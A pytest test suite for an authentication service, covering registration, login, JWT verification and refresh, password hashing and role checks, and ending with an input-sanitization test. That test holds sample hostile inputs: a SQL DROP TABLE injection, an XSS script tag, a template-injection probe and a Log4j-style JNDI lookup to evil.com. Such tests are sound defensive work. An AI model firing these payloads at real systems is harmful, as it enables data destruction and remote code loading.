"""
MetroMind Backend Tests - Authentication Service
Comprehensive testing for user authentication, authorization, and security
"""

import pytest
import jwt
import bcrypt
from datetime import datetime, timedelta
from fastapi.testclient import TestClient
from unittest.mock import Mock, patch
import os
import sys

# Import the auth service to test
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from services.auth_service import app as auth_app
from database import get_db

# Test client setup
client = TestClient(auth_app)

class TestAuthService:
    """Test suite for authentication service functionality"""
    
    @pytest.fixture(autouse=True)
    def setup_method(self):
        """Set up test environment before each test"""
        self.test_user = {
            "username": "testuser",
            "email": "test@example.com",
            "full_name": "Test User",
            "password": "TestPassword123!"
        }
        self.test_admin = {
            "username": "admin",
            "email": "admin@example.com",
            "full_name": "Admin User",
            "password": "AdminPassword123!",
            "role": "admin"
        }
        self.secret_key = "test_secret_key_for_jwt"
    
    def test_health_check(self):
        """Test auth service health endpoint"""
        response = client.get("/health")
        assert response.status_code == 200
        data = response.json()
        assert data["status"] == "healthy"
        assert "service" in data
        assert "timestamp" in data
    
    def test_user_registration_success(self):
        """Test successful user registration"""
        with patch('services.auth_service.get_db_connection') as mock_db:
            mock_conn = Mock()
            mock_cursor = Mock()
            mock_db.return_value.__enter__.return_value = mock_conn
            mock_conn.cursor.return_value.__enter__.return_value = mock_cursor
            
            # Mock user doesn't exist
            mock_cursor.fetchone.return_value = None
            # Mock successful insertion
            mock_cursor.lastrowid = 1
            
            response = client.post("/auth/register", json=self.test_user)
            
            assert response.status_code == 201
            data = response.json()
            assert data["status"] == "success"
            assert "user_id" in data
            assert "access_token" in data
            assert data["user"]["username"] == self.test_user["username"]
            assert data["user"]["email"] == self.test_user["email"]
            # Ensure password is not returned
            assert "password" not in data["user"]
    
    def test_user_registration_duplicate_username(self):
        """Test registration with duplicate username"""
        with patch('services.auth_service.get_db_connection') as mock_db:
            mock_conn = Mock()
            mock_cursor = Mock()
            mock_db.return_value.__enter__.return_value = mock_conn
            mock_conn.cursor.return_value.__enter__.return_value = mock_cursor
            
            # Mock user already exists
            mock_cursor.fetchone.return_value = {"id": 1, "username": "testuser"}
            
            response = client.post("/auth/register", json=self.test_user)
            
            assert response.status_code == 400
            data = response.json()
            assert "error" in data
            assert "already exists" in data["error"].lower()
    
    def test_user_registration_invalid_email(self):
        """Test registration with invalid email format"""
        invalid_user = self.test_user.copy()
        invalid_user["email"] = "invalid-email"
        
        response = client.post("/auth/register", json=invalid_user)
        
        assert response.status_code == 422
        data = response.json()
        assert "detail" in data
    
    def test_user_registration_weak_password(self):
        """Test registration with weak password"""
        weak_passwords = [
            "123",  # Too short
            "password",  # No uppercase, no numbers, no special chars
            "Password",  # No numbers, no special chars
            "Password123",  # No special chars
            "password123!"  # No uppercase
        ]
        
        for weak_password in weak_passwords:
            weak_user = self.test_user.copy()
            weak_user["password"] = weak_password
            
            response = client.post("/auth/register", json=weak_user)
            
            assert response.status_code == 400, f"Password '{weak_password}' should be rejected"
            data = response.json()
            assert "password" in data["error"].lower()
    
    def test_user_login_success(self):
        """Test successful user login"""
        with patch('services.auth_service.get_db_connection') as mock_db:
            mock_conn = Mock()
            mock_cursor = Mock()
            mock_db.return_value.__enter__.return_value = mock_conn
            mock_conn.cursor.return_value.__enter__.return_value = mock_cursor
            
            # Mock user exists with hashed password
            hashed_password = bcrypt.hashpw("TestPassword123!".encode('utf-8'), bcrypt.gensalt())
            mock_cursor.fetchone.return_value = {
                "id": 1,
                "username": "testuser",
                "email": "test@example.com",
                "full_name": "Test User",
                "password_hash": hashed_password.decode('utf-8'),
                "role": "user",
                "is_active": True
            }
            
            login_data = {
                "username": "testuser",
                "password": "TestPassword123!"
            }
            
            response = client.post("/auth/login", json=login_data)
            
            assert response.status_code == 200
            data = response.json()
            assert data["status"] == "success"
            assert "access_token" in data
            assert "refresh_token" in data
            assert data["user"]["username"] == "testuser"
            assert "password" not in data["user"]
    
    def test_user_login_invalid_credentials(self):
        """Test login with invalid credentials"""
        with patch('services.auth_service.get_db_connection') as mock_db:
            mock_conn = Mock()
            mock_cursor = Mock()
            mock_db.return_value.__enter__.return_value = mock_conn
            mock_conn.cursor.return_value.__enter__.return_value = mock_cursor
            
            # Mock user not found
            mock_cursor.fetchone.return_value = None
            
            login_data = {
                "username": "nonexistent",
                "password": "wrongpassword"
            }
            
            response = client.post("/auth/login", json=login_data)
            
            assert response.status_code == 401
            data = response.json()
            assert "error" in data
            assert "invalid" in data["error"].lower()
    
    def test_user_login_wrong_password(self):
        """Test login with correct username but wrong password"""
        with patch('services.auth_service.get_db_connection') as mock_db:
            mock_conn = Mock()
            mock_cursor = Mock()
            mock_db.return_value.__enter__.return_value = mock_conn
            mock_conn.cursor.return_value.__enter__.return_value = mock_cursor
            
            # Mock user exists
            hashed_password = bcrypt.hashpw("TestPassword123!".encode('utf-8'), bcrypt.gensalt())
            mock_cursor.fetchone.return_value = {
                "id": 1,
                "username": "testuser",
                "password_hash": hashed_password.decode('utf-8'),
                "is_active": True
            }
            
            login_data = {
                "username": "testuser",
                "password": "WrongPassword123!"
            }
            
            response = client.post("/auth/login", json=login_data)
            
            assert response.status_code == 401
            data = response.json()
            assert "error" in data
    
    def test_user_login_inactive_account(self):
        """Test login with inactive account"""
        with patch('services.auth_service.get_db_connection') as mock_db:
            mock_conn = Mock()
            mock_cursor = Mock()
            mock_db.return_value.__enter__.return_value = mock_conn
            mock_conn.cursor.return_value.__enter__.return_value = mock_cursor
            
            # Mock inactive user
            hashed_password = bcrypt.hashpw("TestPassword123!".encode('utf-8'), bcrypt.gensalt())
            mock_cursor.fetchone.return_value = {
                "id": 1,
                "username": "testuser",
                "password_hash": hashed_password.decode('utf-8'),
                "is_active": False
            }
            
            login_data = {
                "username": "testuser",
                "password": "TestPassword123!"
            }
            
            response = client.post("/auth/login", json=login_data)
            
            assert response.status_code == 403
            data = response.json()
            assert "inactive" in data["error"].lower()
    
    @patch('services.auth_service.JWT_SECRET', "test_secret")
    def test_token_validation_success(self):
        """Test successful token validation"""
        # Create a valid token
        payload = {
            "user_id": 1,
            "username": "testuser",
            "role": "user",
            "exp": datetime.utcnow() + timedelta(hours=1)
        }
        token = jwt.encode(payload, "test_secret", algorithm="HS256")
        
        headers = {"Authorization": f"Bearer {token}"}
        
        response = client.get("/auth/verify", headers=headers)
        
        assert response.status_code == 200
        data = response.json()
        assert data["valid"] == True
        assert data["user"]["user_id"] == 1
        assert data["user"]["username"] == "testuser"
    
    @patch('services.auth_service.JWT_SECRET', "test_secret")
    def test_token_validation_expired(self):
        """Test token validation with expired token"""
        # Create an expired token
        payload = {
            "user_id": 1,
            "username": "testuser",
            "role": "user",
            "exp": datetime.utcnow() - timedelta(hours=1)  # Expired
        }
        token = jwt.encode(payload, "test_secret", algorithm="HS256")
        
        headers = {"Authorization": f"Bearer {token}"}
        
        response = client.get("/auth/verify", headers=headers)
        
        assert response.status_code == 401
        data = response.json()
        assert data["valid"] == False
        assert "expired" in data["error"].lower()
    
    def test_token_validation_invalid_token(self):
        """Test token validation with invalid token"""
        headers = {"Authorization": "Bearer invalid_token"}
        
        response = client.get("/auth/verify", headers=headers)
        
        assert response.status_code == 401
        data = response.json()
        assert data["valid"] == False
        assert "invalid" in data["error"].lower()
    
    def test_token_validation_missing_token(self):
        """Test token validation without token"""
        response = client.get("/auth/verify")
        
        assert response.status_code == 401
        data = response.json()
        assert "missing" in data["error"].lower() or "required" in data["error"].lower()
    
    @patch('services.auth_service.JWT_SECRET', "test_secret")
    def test_token_refresh_success(self):
        """Test successful token refresh"""
        # Create a valid refresh token
        payload = {
            "user_id": 1,
            "username": "testuser",
            "token_type": "refresh",
            "exp": datetime.utcnow() + timedelta(days=30)
        }
        refresh_token = jwt.encode(payload, "test_secret", algorithm="HS256")
        
        with patch('services.auth_service.get_db_connection') as mock_db:
            mock_conn = Mock()
            mock_cursor = Mock()
            mock_db.return_value.__enter__.return_value = mock_conn
            mock_conn.cursor.return_value.__enter__.return_value = mock_cursor
            
            # Mock user exists
            mock_cursor.fetchone.return_value = {
                "id": 1,
                "username": "testuser",
                "email": "test@example.com",
                "role": "user",
                "is_active": True
            }
            
            response = client.post(
                "/auth/refresh",
                json={"refresh_token": refresh_token}
            )
            
            assert response.status_code == 200
            data = response.json()
            assert "access_token" in data
            assert "refresh_token" in data
    
    def test_logout_success(self):
        """Test successful logout"""
        with patch('services.auth_service.get_db_connection') as mock_db:
            mock_conn = Mock()
            mock_cursor = Mock()
            mock_db.return_value.__enter__.return_value = mock_conn
            mock_conn.cursor.return_value.__enter__.return_value = mock_cursor
            
            headers = {"Authorization": "Bearer valid_token"}
            
            response = client.post("/auth/logout", headers=headers)
            
            assert response.status_code == 200
            data = response.json()
            assert data["status"] == "success"

class TestPasswordSecurity:
    """Test suite for password security features"""
    
    def test_password_hashing(self):
        """Test password hashing functionality"""
        password = "TestPassword123!"
        
        # Test that same password produces different hashes
        hash1 = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
        hash2 = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())
        
        assert hash1 != hash2
        
        # Test that both hashes verify correctly
        assert bcrypt.checkpw(password.encode('utf-8'), hash1)
        assert bcrypt.checkpw(password.encode('utf-8'), hash2)
        
        # Test that wrong password fails
        assert not bcrypt.checkpw("WrongPassword".encode('utf-8'), hash1)
    
    def test_password_strength_validation(self):
        """Test password strength validation rules"""
        # This would test the password strength validation function
        # if implemented in the auth service
        pass
    
    def test_password_reset_functionality(self):
        """Test password reset functionality"""
        # This would test password reset if implemented
        pass

class TestRoleBasedAccess:
    """Test suite for role-based access control"""
    
    @patch('services.auth_service.JWT_SECRET', "test_secret")
    def test_admin_access_required(self):
        """Test endpoints that require admin access"""
        # Create a regular user token
        user_payload = {
            "user_id": 1,
            "username": "testuser",
            "role": "user",
            "exp": datetime.utcnow() + timedelta(hours=1)
        }
        user_token = jwt.encode(user_payload, "test_secret", algorithm="HS256")
        
        # Create an admin token
        admin_payload = {
            "user_id": 2,
            "username": "admin",
            "role": "admin",
            "exp": datetime.utcnow() + timedelta(hours=1)
        }
        admin_token = jwt.encode(admin_payload, "test_secret", algorithm="HS256")
        
        # Test admin-only endpoint (if exists)
        user_headers = {"Authorization": f"Bearer {user_token}"}
        admin_headers = {"Authorization": f"Bearer {admin_token}"}
        
        # This would test actual admin endpoints when implemented
        # response = client.get("/auth/admin/users", headers=user_headers)
        # assert response.status_code == 403
        
        # response = client.get("/auth/admin/users", headers=admin_headers)
        # assert response.status_code == 200
    
    def test_user_role_management(self):
        """Test user role assignment and management"""
        # This would test role assignment functionality
        pass

class TestSecurityFeatures:
    """Test suite for additional security features"""
    
    def test_rate_limiting(self):
        """Test rate limiting on login attempts"""
        # This would test rate limiting if implemented
        pass
    
    def test_account_lockout(self):
        """Test account lockout after failed attempts"""
        # This would test account lockout functionality
        pass
    
    def test_session_management(self):
        """Test session management and cleanup"""
        # This would test session management if implemented
        pass
    
    def test_input_sanitization(self):
        """Test input sanitization against injection attacks"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}"  # Log4j style
        ]
        
        for malicious_input in malicious_inputs:
            malicious_user = {
                "username": malicious_input,
                "email": f"{malicious_input}@example.com",
                "full_name": malicious_input,
                "password": "TestPassword123!"
            }
            
            response = client.post("/auth/register", json=malicious_user)
            
            # Should either reject with 400/422 or sanitize the input
            assert response.status_code in [400, 422] or response.status_code == 201
            
            if response.status_code == 201:
                # If registration succeeded, ensure input was sanitized
                data = response.json()
                assert malicious_input not in str(data)

if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])